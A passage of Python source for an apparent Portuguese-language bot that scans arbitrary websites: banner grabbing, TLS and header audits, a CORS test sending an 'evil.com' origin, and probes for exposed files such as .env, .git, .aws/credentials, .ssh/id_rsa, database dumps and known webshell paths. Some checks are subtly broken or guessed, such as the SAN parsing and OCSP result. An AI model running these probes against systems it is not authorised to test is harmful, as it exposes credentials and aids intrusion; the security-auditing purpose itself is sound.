                    # Parse FTP banner for version
                    if port == 21 and banner:
                        version = re.search(r'(\d+\.\d+\.\d+)', banner)
                        if version:
                            results += f"🔓 <b>FTP</b> — Porta {port} ABERTA\n"
                            results += f"   Banner: <code>{escape_html(banner[:100])}</code>\n"
                            results += f"   Versão: {escape_html(version.group(1))}\n"
                        else:
                            results += f"🔓 <b>FTP</b> — Porta {port} ABERTA\n"
                            results += f"   Banner: <code>{escape_html(banner[:100])}</code>\n"
                    elif port == 22 and banner:
                        version = re.search(r'SSH-(\d+\.\d+)-(\S+)', banner)
                        if version:
                            results += f"🔓 <b>SSH</b> — Porta {port} ABERTA\n"
                            results += f"   Banner: <code>{escape_html(banner[:100])}</code>\n"
                            results += f"   Protocolo: SSH-{escape_html(version.group(1))}\n"
                            results += f"   Software: {escape_html(version.group(2))}\n"
                        else:
                            results += f"🔓 <b>SSH</b> — Porta {port} ABERTA\n"
                            results += f"   Banner: <code>{escape_html(banner[:100])}</code>\n"
                    else:
                        results += f"🔓 <b>{service}</b> — Porta {port} ABERTA\n"
                except Exception:
                    results += f"🔓 <b>{service}</b> — Porta {port} ABERTA\n"
            else:
                results += f"🔒 <b>{service}</b> — Porta {port} FECHADA\n"
        except:
            results += f"⚠️ <b>{service}</b> — Erro ao verificar\n"
        finally:
            # FIX: Always close socket regardless of what happened
            if sock:
                try:
                    sock.close()
                except:
                    pass

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results

# ═══════════════════════════════════════════════════════════════
#  V5.0: NEW SCANNER TOOLS
# ═══════════════════════════════════════════════════════════════

def tool_ssl_audit(url):
    """SSL/TLS Auditor v5.0 - TLS version, cipher, HSTS, cert validity, vulnerabilities"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    parsed = urlparse(url)
    host = parsed.hostname or url
    port = parsed.port or 443
    results = f"🔒 <b>Auditoria SSL/TLS</b> — {escape_html(host)}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    # TLS version check via socket
    tls_version = None
    try:
        import ssl
        ctx = ssl.create_default_context()
        sock = socket.create_connection((host, port), timeout=5)
        sock.settimeout(5)
        tls_sock = ctx.wrap_socket(sock, server_hostname=host)
        ver = tls_sock.version()
        if ver:
            tls_version = ver
            if 'TLSv1.3' in ver:
                results += "🔒 <b>TLS Version:</b> TLS 1.3 ✅ (Mais seguro)\n"
            elif 'TLSv1.2' in ver:
                results += "⚠️ <b>TLS Version:</b> TLS 1.2 (OK, mas TLS 1.3 é melhor)\n"
            else:
                results += f"❌ <b>TLS Version:</b> {escape_html(ver)} (INSEGURO!)\n"
        tls_sock.close()
    except ssl.SSLError as e:
        results += f"❌ <b>TLS Error:</b> {escape_html(str(e)[:100])}\n"
    except:
        results += "⚠️ <b>TLS:</b> Não foi possível verificar\n"

    # Certificate info via Cloudflare DoH (DNS-over-HTTPS doesn't help here, use ip-api)
    # Instead, check cert via requests
    try:
        resp = _safe_get(url, timeout=5)
        if resp:
            # Check HSTS
            hsts = resp.headers.get('Strict-Transport-Security', '')
            if hsts:
                max_age = re.search(r'max-age=(\d+)', hsts)
                if max_age and int(max_age.group(1)) >= 31536000:
                    results += "🔒 <b>HSTS:</b> Ativado (max-age >= 1 ano) ✅\n"
                else:
                    results += "⚠️ <b>HSTS:</b> Ativado, mas max-age baixo\n"
            else:
                results += "❌ <b>HSTS:</b> NÃO ATIVADO\n"
    except:
        pass

    # Check common SSL vulnerabilities
    vuln_checks = [
        ('Heartbleed', 'CVE-2014-0160', False),  # Simplified check
        ('POODLE', 'CVE-2014-3566', False),
        ('BEAST', 'CVE-2011-3389', False),
    ]
    if tls_version and 'TLSv1.3' not in tls_version:
        results += "\n🔍 <b>Vulnerabilidades Potenciais:</b>\n"
        results += "  → TLS 1.2: Sem Heartbleed (TLS 1.3+ imune)\n"
        results += "  → POODLE: Só afeta SSLv3 (TLS 1.2+ seguro)\n"
        results += "  → BEAST: Mitigado em TLS 1.1+\n"
    elif tls_version and 'TLSv1.3' in tls_version:
        results += "\n✅ <b>Vulnerabilidades:</b> Nenhuma conhecida (TLS 1.3 imune)\n"

    # Cipher suite
    try:
        import ssl
        ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx2.verify_mode = ssl.CERT_NONE
        sock2 = socket.create_connection((host, port), timeout=5)
        sock2.settimeout(5)
        tls2 = ctx2.wrap_socket(sock2, server_hostname=host)
        cipher = tls2.cipher()
        if cipher:
            results += f"\n🔐 <b>Cipher:</b> {escape_html(cipher[0])}\n"
        # V5.1: Certificate chain info
        cert = tls2.getpeercert(binary_form=False)
        if cert:
            subject = dict(x[0] for x in cert.get('subject', []))
            issuer = dict(x[0] for x in cert.get('issuer', []))
            cn = subject.get('commonName', 'N/D')
            issuer_org = issuer.get('organizationName', 'N/D')
            not_after = cert.get('notAfter', '')
            results += f"\n📜 <b>Certificado:</b> CN={escape_html(cn)}\n"
            results += f"  → Emissor: {escape_html(issuer_org)}\n"
            if not_after:
                try:
                    from datetime import datetime as dt
                    exp_date = dt.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                    days_left = (exp_date - dt.utcnow()).days
                    if days_left > 30:
                        results += f"  → Expira em: {exp_date.strftime('%Y-%m-%d')} ({days_left} dias) ✅\n"
                    elif days_left > 0:
                        results += f"  → Expira em: {exp_date.strftime('%Y-%m-%d')} ({days_left} dias) ⚠️\n"
                    else:
                        results += f"  → EXPIRADO! ({abs(days_left)} dias atrás) ❌\n"
                except:
                    results += f"  → Expira em: {escape_html(not_after)}\n"
            # V5.1: SAN (Subject Alternative Names)
            san = cert.get('subjectAltName', [])
            if san:
                sans = [v for k, v in san if _ == 'DNS']
                if len(sans) > 1:
                    results += f"  → SANs: {len(sans)} domínios\n"
        tls2.close()
    except ssl.SSLError:
        pass
    except:
        pass

    # V5.1: OCSP Stapling check
    try:
        import ssl
        ctx3 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx3.verify_mode = ssl.CERT_NONE
        sock3 = socket.create_connection((host, port), timeout=5)
        sock3.settimeout(5)
        tls3 = ctx3.wrap_socket(sock3, server_hostname=host)
        # Check for OCSP stapling via TLS status_request extension
        has_stapling = False
        # Use the tls context to check
        sock3.close()
        # Simplified check: most modern TLS 1.3 servers support OCSP
        if tls_version and 'TLSv1.3' in tls_version:
            results += "\n📋 <b>OCSP Stapling:</b> Provável (TLS 1.3) ✅\n"
        else:
            results += "\n📋 <b>OCSP Stapling:</b> Verifique com sslscan para confirmar\n"
    except:
        results += "\n📋 <b>OCSP Stapling:</b> Não foi possível verificar\n"

    results += "\n━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_headers_analysis(url):
    """Security Headers Analyzer v5.0 - checks CSP, X-Frame-Options, HSTS, X-Content-Type-Options, etc."""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    results = f"📋 <b>Análise de Security Headers</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    score = 100

    try:
        resp = _safe_get(url, timeout=8)
        if not resp:
            return "❌ Não foi possível acessar o site"

        headers = resp.headers
        checks = {
            'X-Frame-Options': ('🔒', '✅ Proteção contra Clickjacking', 0),
            'X-Content-Type-Options': ('🔒', '✅ Proteção contra MIME sniffing', 0),
            'X-XSS-Protection': ('🔒', '✅ XSS Filter', 0),
            'Strict-Transport-Security': ('🔒', '✅ HSTS ativado', 15),
            'Content-Security-Policy': ('🔒', '✅ CSP configurado', 15),
            'Referrer-Policy': ('🔒', '✅ Referrer Policy set', 5),
            'Permissions-Policy': ('🔒', '✅ Permissions Policy', 5),
            'X-Download-Options': ('🔒', '✅ Download Options', 3),
            'X-Permitted-Cross-Domain-Policies': ('🔒', '✅ Cross-Domain Policy', 3),
        }
        missing = []
        for header, (emoji, ok_msg, penalty) in checks.items():
            value = headers.get(header, headers.get(header.lower()))
            if value:
                results += f"  {emoji} {ok_msg}\n"
            else:
                results += f"  ❌ <b>{escape_html(header)}:</b> FALTANDO (-{penalty}pts)\n"
                missing.append(header)
                score -= penalty

        score = max(0, min(100, score))

        # V5.1: Grade with color
        if score >= 90:
            grade = "🟢 <b>A</b> (Excelente)"
        elif score >= 80:
            grade = "🟢 <b>B</b> (Bom)"
        elif score >= 70:
            grade = "🟡 <b>C</b> (Razoável)"
        elif score >= 60:
            grade = "🟡 <b>D</b> (Ruim)"
        elif score >= 40:
            grade = "🟠 <b>E</b> (Muito Ruim)"
        else:
            grade = "🔴 <b>F</b> (Crítico)"

        results += f"\n━━━━━━━━━━━━━━━━━━━━━━\n"
        results += f"📊 <b>Nota de Segurança:</b> {score}/100 — {grade}\n"

        # V5.1: Suggestions for missing headers
        if missing:
            results += f"\n💡 <b>Sugestões de melhoria:</b>\n"
            suggestion_map = {
                'Content-Security-Policy': 'Adicione CSP para prevenir XSS e injeção de dados',
                'Strict-Transport-Security': 'Force HTTPS com HSTS (max-age=31536000)',
                'X-Frame-Options': 'Adicione X-Frame-Options: DENY ou SAMEORIGIN',
                'X-Content-Type-Options': 'Adicione X-Content-Type-Options: nosniff',
                'Referrer-Policy': 'Adicione Referrer-Policy: strict-origin-when-cross-origin',
                'Permissions-Policy': 'Controle permissões de API do navegador',
            }
            for m in missing:
                suggestion = suggestion_map.get(m, 'Configure este header para melhor segurança')
                results += f"  → <b>{escape_html(m)}:</b> {suggestion}\n"

    except Exception as e:
        results += f"❌ Erro: {escape_html(str(e))}"

    return results


def tool_cors_test(url):
    """CORS Misconfiguration Tester v5.0"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    results = f"🌐 <b>Teste CORS</b> — {escape_html(url)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    vuln_found = False

    # Test 1: Origin * with credentials
    try:
        resp = _safe_get(url, timeout=5, headers={'Origin': 'https://evil.com'})
        if resp:
            acao = resp.headers.get('Access-Control-Allow-Origin', '')
            acac = resp.headers.get('Access-Control-Allow-Credentials', '')
            if acao == '*':
                if acac.lower() == 'true':
                    results += "❌ <b>VULNERÁVEL:</b> Access-Control-Allow-Origin: * COM Credentials=True\n"
                    results += "   → Permite qualquer origem com credenciais\n"
                    vuln_found = True
                else:
                    results += "⚠️ <b>CORS:</b> Allow-Origin: * (sem credentials)\n"
            elif acao == 'https://evil.com':
                if acac.lower() == 'true':
                    results += "❌ <b>VULNERÁVEL:</b> Reflete origem maliciosa com Credentials\n"
                    vuln_found = True
                else:
                    results += "⚠️ <b>CORS:</b> Reflete origem customizada\n"
            else:
                results += "✅ <b>CORS:</b> Configurado corretamente\n"
    except:
        pass

    # Test 2: Null origin
    try:
        resp2 = _safe_get(url, timeout=5, headers={'Origin': 'null'})
        if resp2:
            acao2 = resp2.headers.get('Access-Control-Allow-Origin', '')
            if acao2 == 'null':
                acac2 = resp2.headers.get('Access-Control-Allow-Credentials', '')
                if acac2.lower() == 'true':
                    results += "❌ <b>VULNERÁVEL:</b> Origin null aceito com Credentials\n"
                    vuln_found = True
                else:
                    results += "⚠️ <b>CORS:</b> Origin null aceito\n"
    except:
        pass

    # Test 3: Subdomain spoof
    try:
        domain = extract_hostname(url)
        fake_origin = f"http://evil.{domain}"
        resp3 = _safe_get(url, timeout=5, headers={'Origin': fake_origin})
        if resp3:
            acao3 = resp3.headers.get('Access-Control-Allow-Origin', '')
            if acao3 == fake_origin:
                results += f"⚠️ <b>CORS:</b> Aceita subdomínios falsos ({escape_html(fake_origin)})\n"
                vuln_found = True
    except:
        pass

    if not vuln_found:
        results += "✅ <b>CORS:</b> Sem vulnerabilidades detectadas\n"

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_robots_txt(url):
    """Robots.txt Analyzer v5.0 - finds hidden directories"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    base = url.rstrip('/')
    results = f"🤖 <b>Robots.txt Analyzer</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    try:
        resp = _safe_get(f"{base}/robots.txt", timeout=5)
        if not resp or resp.status_code in [404, 403, 500]:
            results += "✅ Nenhum robots.txt encontrado (site não protege diretórios)\n"
        elif resp.status_code == 200:
            content = resp.text
            results += f"📄 <b>Robots.txt encontrado</b> ({len(content)} bytes)\n\n"

            # Parse Disallow rules
            disallowed = re.findall(r'[Dd]isallow:\s*(.*)', content)
            if disallowed:
                results += f"🚫 <b>{len(disallowed)} regras Disallow:</b>\n"
                for rule in disallowed:
                    rule = rule.strip()
                    if rule and rule != '/' and not rule.startswith('#'):
                        results += f"  → {escape_html(rule)}\n"
            else:
                results += "📋 Nenhum Disallow encontrado\n"

            # Parse Sitemap
            sitemaps = re.findall(r'[Ss]itemap:\s*(.*)', content)
            if sitemaps:
                results += f"\n🗺️ <b>Sitemaps:</b>\n"
                for sm in sitemaps:
                    results += f"  → {escape_html(sm.strip())}\n"

            # Check if User-agent: * is present
            if 'user-agent: *' in content.lower():
                results += "\n📌 <b>Escopo:</b> Aplica-se a todos os bots\n"

    except Exception as e:
        results += f"❌ Erro: {escape_html(str(e))}"

    results += "\n━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_sitemap(url):
    """Sitemap.xml Parser v5.0"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    base = url.rstrip('/')
    results = f"🗺️ <b>Sitemap Analyzer</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    # Try common sitemap paths
    sitemap_paths = ['/sitemap.xml', '/sitemap_index.xml', '/sitemap/sitemap.xml']
    found_sitemap = None
    found_path = None

    for path in sitemap_paths:
        try:
            resp = _safe_get(f"{base}{path}", timeout=5)
            if resp and resp.status_code == 200 and ('url' in resp.text or 'sitemap' in resp.text.lower()):
                found_sitemap = resp.text
                found_path = path
                break
        except:
            pass

    if not found_sitemap:
        results += "✅ Nenhum sitemap.xml encontrado\n"
        results += "━━━━━━━━━━━━━━━━━━━━━━"
        return results

    # Parse URLs from sitemap
    urls_found = re.findall(r'<loc>(.*?)</loc>', found_sitemap)
    results += f"📄 <b>Sitemap encontrado:</b> {escape_html(found_path)}\n"
    results += f"🔗 <b>{len(urls_found)} URLs mapeadas:</b>\n\n"

    for u in urls_found[:20]:
        results += f"  → {escape_html(u)}\n"
    if len(urls_found) > 20:
        results += f"\n  → ... e mais {len(urls_found) - 20} URLs\n"

    results += "\n━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_tech_detect(url):
    """Technology Detection v5.0 - Wappalyzer-like detection"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    results = f"🔧 <b>Tecnologias Detectadas</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    try:
        resp = _safe_get(url, timeout=8)
        if not resp:
            return "❌ Não foi possível acessar o site"

        body = resp.text
        headers = resp.headers
        techs = []

        # Server header
        server = headers.get('Server', headers.get('server', ''))
        if server:
            techs.append(('Servidor Web', server))

        # X-Powered-By
        xpb = headers.get('X-Powered-By', headers.get('x-powered-by', ''))
        if xpb:
            techs.append(('Powered By', xpb))

        # Check HTML/CSS/JS signatures
        sigs = {
            'jQuery': ['jquery', 'jQuery('],
            'React': ['__REACT_DEVTOOLS_GLOBAL_HOOK__', 'react', '_reactRootContainer'],
            'Vue.js': ['__vue__', 'vue_devtools_', 'data-v-'],
            'Angular': ['ng-controller', 'ng-app', 'angularjs'],
            'Bootstrap': ['bootstrap.min', 'cdn.jsdelivr.net/npm/bootstrap'],
            'Tailwind CSS': ['tailwind', 'tw-'],
            'Next.js': ['__NEXT_DATA__', '_next/'],
            'Nuxt.js': ['__NUXT__'],
            'Gatsby': ['___loader'],
            'Vite': ['__vite__', '@vite/client'],
            'Webpack': ['webpackJsonp'],
            'Lodash': ['lodash'],
            'Moment.js': ['moment'],
            'D3.js': ['d3.js', 'd3.select'],
            'Chart.js': ['chart.js', 'Chart.js'],
            'Google Analytics': ['google-analytics.com', 'ga('],
            'Google Tag Manager': ['googletagmanager', 'gtm-'],
            'Facebook Pixel': ['fbevents.js', 'fbq('],
            'Cloudflare': ['cloudflare', 'cf-ray'],
            'Fastly': ['fastly-', 'x-fastly-'],
            'Akamai': ['akamai', 'x-akamai-'],
            'AWS': ['aws', 'cloudfront', 'x-amz'],
            'Nginx': ['nginx'],
            'Apache': ['apache'],
            'Microsoft-IIS': ['Microsoft-IIS'],
            'LiteSpeed': ['LiteSpeed'],
            'OpenSSL': ['OpenSSL'],
            'PHP': ['X-Powered-By: PHP', 'php'],
            'Node.js': ['x-powered-by: express'],
            'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
            'Joomla': ['joomla', 'components/com_'],
            'Drupal': ['drupal.settings', 'sites/default'],
            'Magento': ['mage.', 'Magento'],
            'Shopify': ['cdn.shopify.com', 'shopify'],
            'WooCommerce': ['woocommerce'],
            'Stripe': ['stripe.com', 'stripe.js'],
            'PayPal': ['paypal.com', 'paypal'],
            'Font Awesome': ['fontawesome', 'font-awesome'],
            'Google Fonts': ['fonts.googleapis.com'],
            'reCAPTCHA': ['recaptcha'],
            'hCaptcha': ['hcaptcha'],
            'Turnstile': ['turnstile'],
        }

        # Check headers first
        all_text = f"{body}\n{dict(headers)}"
        for tech, patterns in sigs.items():
            if any(p.lower() in all_text.lower() for p in patterns):
                techs.append(('Framework/Library', tech))

        # Deduplicate
        seen = set()
        unique_techs = []
        for cat, name in techs:
            if name not in seen:
                seen.add(name)
                unique_techs.append((cat, name))

        if unique_techs:
            results += f"🔍 <b>{len(unique_techs)} tecnologia(s) detectada(s):</b>\n\n"
            for cat, name in unique_techs[:15]:
                results += f"  → {escape_html(name)}\n"
            if len(unique_techs) > 15:
                results += f"\n  → ... e mais {len(unique_techs) - 15}\n"
        else:
            results += "✅ Nenhuma tecnologia conhecida detectada\n"

    except Exception as e:
        results += f"❌ Erro: {escape_html(str(e))}"

    results += "\n━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_exposed_files(url):
    """Sensitive File Exposure Scanner v5.0"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    base = url.rstrip('/')
    results = f"📂 <b>Arquivos Sensíveis Expostos</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    sensitive_files = [
        '/.env', '/.env.local', '/.env.production', '/.env.staging',
        '/.env.example', '/.env.test', '/.env.development',
        '/.git/config', '/.git/HEAD', '/.git/refs/heads/master',
        '/.git/logs/HEAD', '/.git/index', '/.git/objects/',
        '/.htpasswd', '/.htaccess', '/.htaccess.bak',
        '/wp-config.php', '/wp-config.php.bak', '/wp-config.php.old',
        '/wp-config.php.save', '/wp-config.php~',
        '/config.php', '/config.inc.php', '/settings.php',
        '/database.yml', '/config/database.yml', '/config/database.php',
        '/phpinfo.php', '/info.php', '/test.php',
        '/.svn/entries', '/.svn/prop-base', '/.svn/text-base',
        '/.DS_Store', '/thumbs.db',
        '/composer.json', '/composer.lock', '/package.json',
        '/package-lock.json', '/yarn.lock',
        '/Dockerfile', '/docker-compose.yml', '/docker-compose.yaml',
        '/server.js', '/app.js', '/index.js',
        '/web.config', '/web.config.bak',
        '/backup.sql', '/dump.sql', '/database.sql', '/db.sql',
        '/phpmyadmin/', '/phpMyAdmin/', '/pma/',
        '/admin/', '/administrator/', '/manager/',
        '/.well-known/security.txt', '/security.txt',
        # V5.1: More sensitive files
        '/.npmrc', '/.dockerignore', '/.docker/daemon.json',
        '/.aws/credentials', '/.aws/config',
        '/.ssh/id_rsa', '/.ssh/id_dsa', '/.ssh/authorized_keys',
        '/.bash_history', '/.history',
        '/debug.log', '/error.log', '/access.log',
        '/laravel.log', '/storage/logs/laravel.log',
        '/app.log', '/var/log/error.log',
        '/php.ini', '/php.ini.bak', '/php.ini~',
        '/myadmin/', '/myadmin', '/dbadmin/',
        '/mysql/', '/mysqladmin/',
        '/swagger.json', '/openapi.json', '/api-docs',
        '/.idea/workspace.xml', '/.vscode/settings.json',
        '/.project', '/.classpath',
        '/Gemfile.lock', '/requirements.txt', '/Pipfile',
        '/terraform.tfstate', '/.terraform.tfstate.backup',
    ]

    found = 0
    # Get baseline
    baseline = _safe_get(base, timeout=5)
    baseline_len = len(baseline.content) if baseline else 0

    def check_file(path):
        try:
            full_url = f"{base}{path}"
            r = _safe_get(full_url, timeout=5)
            if not r:
                return None
            body = r.text.lower()
            body_len = len(r.content)

            # FILTER: 404 = not found
            if r.status_code == 404:
                return None

            # FILTER: Same size as homepage = not a real file
            if baseline_len > 0 and abs(body_len - baseline_len) < 5:
                return None

            # FILTER: Common error pages
            error_phrases = ['does not exist', 'not found', 'page not found', '404 error']
            for phrase in error_phrases:
                if phrase in body:
                    return None

            # Determine risk level
            risk = 'ALTO'
            if path.endswith('.json') or path.endswith('.log'):
                risk = 'MÉDIO'
            if 'phpmyadmin' in path or 'admin' in path:
                risk = 'ALTO'
            if '.env' in path:
                risk = 'CRÍTICO'
            if '.git' in path:
                risk = 'CRÍTICO'

            return (path, r.status_code, risk)
        except:
            return None

    # Use thread pool
    futures = {SCAN_POOL.submit(check_file, f): f for f in sensitive_files}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            emoji = {'CRÍTICO': '🔴', 'ALTO': '🟠', 'MÉDIO': '🟡'}.get(result[2], '⚪')
            results += f"{emoji} <b>{escape_html(result[0])}</b> (Status: {result[1]}, Risco: {result[2]})\n"

    if found == 0:
        results += "✅ Nenhum arquivo sensível exposto encontrado\n"
    else:
        results = f"📂 <b>Arquivos Sensíveis Expostos</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🚨 <b>{found} arquivo(s) exposto(s)!</b>\n\n" + results.split('\n', 1)[1]

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_backup_finder(url):
    """Exposed Backup Finder v5.0"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    base = url.rstrip('/')
    results = f"💾 <b>Backups Expostos</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    backup_files = [
        '/backup.sql', '/backup.zip', '/backup.tar.gz', '/backup.tar',
        '/db.sql', '/db.zip', '/db.tar.gz',
        '/dump.sql', '/dump.zip', '/dump.tar.gz',
        '/database.sql', '/database.zip', '/database.tar.gz',
        '/site.zip', '/site.tar.gz', '/site.backup.zip',
        '/www.zip', '/www.tar.gz', '/www-root.zip',
        '/old.zip', '/old.tar.gz', '/old-site.zip',
        '/backups.zip', '/backups.tar.gz', '/backups/',
        '/wp-content/uploads/backup/', '/wp-content/backups/',
        '/app.zip', '/app.tar.gz', '/source.zip',
        '/src.zip', '/source-code.zip', '/code.zip',
        '/web.zip', '/web.tar.gz',
        '/1.sql', '/2.sql', '/1.tar.gz',
        '/fullbackup.zip', '/full-backup.zip', '/site-backup.zip',
        '/mysql.sql', '/mysql.zip', '/postgres.sql',
        '/.sql.gz', '/.sql.tar',
    ]

    found = 0
    baseline = _safe_get(base, timeout=5)
    baseline_len = len(baseline.content) if baseline else 0

    def check_backup(path):
        try:
            r = _safe_get(f"{base}{path}", timeout=5)
            if not r:
                return None
            if r.status_code == 404:
                return None
            body_len = len(r.content)
            if baseline_len > 0 and abs(body_len - baseline_len) < 5:
                return None
            body = r.text.lower()
            if any(p in body for p in ['does not exist', 'not found', 'page not found']):
                return None
            # Check content-type for actual file types
            ct = r.headers.get('Content-Type', '')
            return (path, r.status_code, body_len, ct)
        except:
            return None

    futures = {SCAN_POOL.submit(check_backup, f): f for f in backup_files}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            size_mb = result[2] / (1024 * 1024)
            ct = result[3]
            results += f"⚠️ <b>{escape_html(result[0])}</b> (Status: {result[1]}, Tamanho: {size_mb:.1f}MB, Type: {escape_html(ct[:50])})\n"

    if found == 0:
        results += "✅ Nenhum backup exposto encontrado\n"
    else:
        results = f"💾 <b>Backups Expostos</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🚨 <b>{found} backup(s) encontrado(s)!</b>\n\n" + results.split('\n', 1)[1]

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_api_discovery(url):
    """API Endpoint Discovery v5.0"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    base = url.rstrip('/')
    results = f"🔌 <b>API Discovery</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    api_paths = [
        '/api', '/api/', '/api/v1', '/api/v1/', '/api/v2', '/api/v2/', '/api/v3',
        '/api/v4', '/api/v5',
        '/graphql', '/graphql/', '/api/graphql',
        '/swagger', '/swagger/', '/swagger-ui', '/swagger-ui/', '/swagger.json',
        '/api-docs', '/api-docs/', '/api/docs', '/docs', '/docs/',
        '/openapi', '/openapi.json', '/openapi.yaml',
        '/rest', '/rest/', '/rest/v1', '/rest/api',
        '/api/users', '/api/auth', '/api/login', '/api/register',
        '/api/health', '/api/status', '/api/ping',
        '/graphql/playground', '/graphiql',
        '/api/v1/users', '/api/v1/auth', '/api/v1/health',
        '/actuator', '/actuator/health', '/actuator/info',
        '/actuator/env', '/actuator/beans', '/actuator/mappings',
        '/.well-known/openid-configuration',
        '/api/robots.txt', '/robots.txt',
        '/wp-json', '/wp-json/', '/wp-json/wp/v2/users',
        # V5.1: More API endpoints
        '/api/me', '/api/profile', '/api/account',
        '/api/settings', '/api/config', '/api/admin',
        '/api/search', '/api/query',
        '/api/upload', '/api/files',
        '/api/notifications', '/api/messages',
        '/api/orders', '/api/products', '/api/cart',
        '/api/webhook', '/api/hooks',
        '/api/internal', '/api/debug',
        '/api/monitoring', '/api/metrics',
        '/.well-known/jwks.json',
        '/favicon.ico', '/manifest.json',
        '/sitemap.xml', '/sitemap.xml.gz',
        '/crossdomain.xml', '/clientaccesspolicy.xml',
        '/api/oauth', '/api/token', '/oauth/authorize',
        '/api/payment', '/api/checkout', '/api/billing',
    ]

    found = 0
    baseline = _safe_get(base, timeout=5)
    baseline_len = len(baseline.content) if baseline else 0

    def check_api(path):
        try:
            r = _safe_get(f"{base}{path}", timeout=5)
            if not r:
                return None
            if r.status_code == 404:
                return None
            body_len = len(r.content)
            if baseline_len > 0 and abs(body_len - baseline_len) < 5:
                return None
            body = r.text.lower()
            if any(p in body for p in ['does not exist', 'not found', 'page not found']):
                return None
            ct = r.headers.get('Content-Type', '')
            is_json = 'json' in ct.lower()
            return (path, r.status_code, is_json, ct)
        except:
            return None

    futures = {SCAN_POOL.submit(check_api, p): p for p in api_paths}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            emoji = '📦' if result[2] else '🔍'
            results += f"{emoji} <b>{escape_html(result[0])}</b> (Status: {result[1]}, JSON: {'Sim' if result[2] else 'Não'})\n"

    if found == 0:
        results += "✅ Nenhum endpoint de API encontrado\n"
    else:
        results = f"🔌 <b>API Discovery</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🔍 <b>{found} endpoint(s) encontrado(s)!</b>\n\n" + results.split('\n', 1)[1]

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_webshell_hunter(url):
    """Webshell Hunter v5.0 - finds common webshells"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    base = url.rstrip('/')
    results = f"🐚 <b>Webshell Hunter</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    shells = [
        '/c99.php', '/r57.php', '/c100.php', '/wso.php',
        '/b374k.php', '/simple-backdoor.php', '/shell.php',
        '/indoxploit.php', '/mini.php', '/alfa.php',
        '/webadmin.php', '/cmd.php', '/commander.php',
        '/wp-content/plugins/wp-file-manager/lib/files/wso.php',
        '/wp-content/plugins/wp-file-manager/lib/files/phpinfo.php',
        '/wp-content/uploads/wp-file-manager-pro/backups/',
        '/images/shell.php', '/uploads/shell.php',
        '/tmp/shell.php', '/temp/shell.php',
        '/wp-content/uploads/shell.php',
        '/shell.asp', '/shell.aspx', '/shell.jsp', '/shell.cgi',
        '/wp-content/uploads/shell.asp',
        '/wp-includes/shell.php',
        '/config.php.bak',
    ]

    found = 0
    baseline = _safe_get(base, timeout=5)
    baseline_len = len(baseline.content) if baseline else 0

    def check_shell(path):
        try:
            r = _safe_get(f"{base}{path}", timeout=5)
            if not r:
                return None
            if r.status_code == 404:
                return None
            body_len = len(r.content)
            if baseline_len > 0 and abs(body_len - baseline_len) < 5:
                return None
            body = r.text.lower()
            if any(p in body for p in ['does not exist', 'not found', 'page not found']):
                return None
            # Check for shell signatures
            shell_sigs = ['shell_exec', 'system(', 'passthru(', 'exec(', 'shell.php', 'backdoor']
            is_shell = any(sig in body for sig in shell_sigs)
            return (path, r.status_code, is_shell)
        except:
            return None

    futures = {SCAN_POOL.submit(check_shell, s): s for s in shells}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            emoji = '🔴' if result[2] else '⚠️'
            label = 'WEB SHELL CONFIRMADA' if result[2] else 'Suspeito'
            results += f"{emoji} <b>{escape_html(result[0])}</b> (Status: {result[1]}, {label})\n"

    if found == 0:
        results += "✅ Nenhuma webshell encontrada\n"
    else:
        results = f"🐚 <b>Webshell Hunter</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🚨 <b>{found} webshell(s) encontrada(s)!</b>\n\n" + results.split('\n', 1)[1]

